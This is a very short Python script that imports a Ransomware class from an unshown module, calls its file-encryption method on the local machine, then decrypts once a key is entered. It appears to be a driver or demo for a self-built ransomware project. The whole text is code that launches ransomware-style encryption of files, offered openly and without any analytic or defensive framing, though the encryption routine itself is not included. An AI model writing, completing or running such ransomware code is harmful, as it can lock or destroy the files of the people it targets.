from ransomware import Ransomware

virus = Ransomware("local")
virus.FileEncryption()

input = input("ENTER key to decrypt")
virus.FileDecryption()